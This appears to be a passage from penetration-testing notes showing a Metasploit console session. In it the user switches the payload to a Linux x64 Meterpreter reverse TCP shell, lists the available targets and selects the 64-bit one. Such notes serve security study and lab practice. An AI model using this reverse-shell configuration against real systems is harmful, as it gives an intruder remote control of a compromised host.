#### Change payload to x64

```
msf6> set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp

msf6> show targets
Exploit targets:                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                                           
   Id  Name                                                                                                                                                                                                                                                   
   --  ----                                                                                                                                                                                                                                                   
   0   x86 (32-bit)                                                                                                                                                                                                                                           
   1   x86_64 (64-bit) 
   
msf6> set target 1   
```
